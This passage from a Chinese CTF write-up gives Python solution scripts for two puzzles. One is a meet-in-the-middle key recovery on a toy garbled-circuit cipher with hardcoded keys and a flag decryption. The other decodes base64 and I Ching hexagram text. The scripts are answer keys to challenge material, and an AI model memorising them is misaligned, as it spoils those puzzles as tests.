punctuation">)</span>    ENCRYPTIONS_OF_ZERO<span class="token punctuation">[</span>ct<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment"># with open('ENCRYPTIONS_OF_ZERO.json', 'r') as f:</span><span class="token comment">#     ENCRYPTIONS_OF_ZERO = json.load(f)</span><span class="token comment">#     f.close()</span><span class="token keyword">def</span> <span class="token function">meet_in_the_middle</span><span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] performing meet-in-the-middle attack for'</span><span class="token punctuation">,</span> ct<span class="token punctuation">)</span>    possible <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dec <span class="token operator">=</span> decrypt_data<span class="token punctuation">(</span>ct<span class="token punctuation">,</span> key<span class="token punctuation">)</span>        <span class="token keyword">if</span> dec <span class="token keyword">in</span> ENCRYPTIONS_OF_ZERO<span class="token punctuation">:</span>            possible<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> ENCRYPTIONS_OF_ZERO<span class="token punctuation">[</span>dec<span class="token punctuation">]</span>    <span class="token keyword">return</span> possible<span class="token keyword">def</span> <span class="token function">recover_keys</span><span class="token punctuation">(</span>Z<span class="token punctuation">,</span> C<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] recovering keys...'</span><span class="token punctuation">)</span>    z1<span class="token punctuation">,</span> z2<span class="token punctuation">,</span> z3<span class="token punctuation">,</span> z4 <span class="token operator">=</span> Z    c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4 <span class="token operator">=</span> C    <span class="token keyword">for</span> b0 <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>z1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> a0 <span class="token keyword">in</span> z1<span class="token punctuation">[</span>b0<span class="token punctuation">]</span><span class="token punctuation">:</span>            p1 <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span>            <span class="token keyword">for</span> c<span class="token punctuation">,</span>z <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>z2<span class="token punctuation">,</span> z3<span class="token punctuation">,</span> z4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> a1 <span class="token keyword">in</span> z<span class="token punctuation">[</span>b0<span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> p1 <span class="token operator">==</span> decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> b0<span class="token punctuation">)</span><span class="token punctuation">:</span>                        b1 <span class="token operator">=</span> recover_keys_part2<span class="token punctuation">(</span>Z<span class="token punctuation">,</span> C<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span>                        <span class="token keyword">if</span> b1<span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'a1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a1<span class="token punctuation">&#125;</span></span><span class="token string">, b1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b1<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'a0 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a0<span class="token punctuation">&#125;</span></span><span class="token string">, b0 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b0<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>                            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>                <span class="token keyword">def</span> <span class="token function">recover_keys_part2</span><span class="token punctuation">(</span>Z<span class="token punctuation">,</span> C<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span><span class="token punctuation">:</span>    z1<span class="token punctuation">,</span> z2<span class="token punctuation">,</span> z3<span class="token punctuation">,</span> z4 <span class="token operator">=</span> Z    c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4 <span class="token operator">=</span> C    <span class="token keyword">for</span> c<span class="token punctuation">,</span>z <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">,</span>c4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>z2<span class="token punctuation">,</span>z3<span class="token punctuation">,</span>z4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> b1 <span class="token keyword">in</span> z<span class="token punctuation">:</span>            <span class="token keyword">if</span> a0 <span class="token keyword">in</span> z<span class="token punctuation">[</span>b1<span class="token punctuation">]</span> <span class="token keyword">and</span> decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b1<span class="token punctuation">)</span> <span class="token operator">==</span> decrypt<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> b1    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    Z <span class="token operator">=</span> <span class="token punctuation">[</span>meet_in_the_middle<span class="token punctuation">(</span>g_tables<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>g<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> g <span class="token keyword">in</span> g_tables<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        recover_keys<span class="token punctuation">(</span><span class="token punctuation">[</span>Z<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> Z<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Z<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>C<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> C<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> C<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>用上面的脚本求出 gate 1,2,3,4 的密钥值, 然后就可以进一步推 gate 5,6,7,8 的密钥值, over.<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> block_cipher <span class="token keyword">import</span> encrypt_data<span class="token punctuation">,</span> decrypt_data<span class="token punctuation">,</span> decrypt<span class="token keyword">from</span> public_data <span class="token keyword">import</span> G_Table<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">validate_the_circuit</span><span class="token punctuation">(</span>geta_table<span class="token punctuation">,</span> key0<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> g <span class="token keyword">in</span> geta_table<span class="token punctuation">:</span>        gl<span class="token punctuation">,</span> v <span class="token operator">=</span> g        label <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>gl<span class="token punctuation">,</span> key0<span class="token punctuation">,</span> key1<span class="token punctuation">)</span>        validation <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>v<span class="token punctuation">,</span> key0<span class="token punctuation">,</span> key1<span class="token punctuation">)</span>                <span class="token keyword">if</span> validation <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> labelk <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">"""key 1, 2a1 = 13675268, b1 = 12870274a0 = 8343801, b0 = 10251687"""</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">13675268</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8343801</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">12870274</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10251687</span><span class="token comment"># geta_table = G_Table[5]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][0], k[2][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][1], k[2][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][0], k[2][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][1], k[2][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15707475</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4567418</span><span class="token triple-quoted-string string">'''key 3, 4a1 = 12490757, b1 = 3391233a0 = 6827786, b0 = 2096572'''</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6827786</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">12490757</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2096572</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3391233</span><span class="token comment"># geta_table = G_Table[6]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][0], k[4][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][1], k[4][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][0], k[4][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][1], k[4][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14095476</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3648155</span><span class="token comment"># geta_table = G_Table[7]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][0], k[6][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][1], k[6][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][0], k[6][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][1], k[6][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14409690</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8680011</span><span class="token comment"># geta_table = G_Table[9]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][0], k[7][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][1], k[7][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][0], k[7][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][1], k[7][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9376523</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2504390</span><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">)</span>the_chaos<span class="token operator">=</span><span class="token string">b''</span>reflag <span class="token operator">=</span> <span class="token number">0x1661fe85c7b01b3db1d432ad3c5ac83a</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    the_chaos <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>mask <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>the_chaos<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token operator">^</span>reflag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="The-is-A-tree"><a href="#The-is-A-tree" class="headerlink" title="The_is_A_tree"></a>The_is_A_tree</h3><ol><li>用 os.walk 先序遍历文件树即可, 后面还有一个伏羲 64 卦</li><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token comment"># s = ''</span><span class="token comment"># for root,dirs,files in os.walk("./"):</span><span class="token comment">#     for fname in files:</span><span class="token comment">#         # print(root, fname)</span><span class="token comment">#         f = open(root + '\\' + fname, 'r')</span><span class="token comment">#         for lines in f.readline():</span><span class="token comment">#             s += lines</span><span class="token comment">#         f.close()</span>        <span class="token comment"># print(s)</span>s <span class="token operator">=</span> <span class="token string">'Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA=='</span><span class="token comment"># base64</span><span class="token comment"># Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫 </span><span class="token comment"># py3</span><span class="token comment"># 参考文献: https://blog.csdn.net/weixin_44110537/article/details/107494966</span>s <span class="token operator">=</span> <span class="token string">'师兑复损巽震晋姤大过讼噬嗑震恒节豫'</span>dic<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>li<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        k<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        t<span class="token operator">=</span><span class="token string">''</span>        t<span class="token operator">=</span>t<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>        li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token operator">=</span><span class="token number">1</span>ss<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>enc<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span aria-hidden="true" 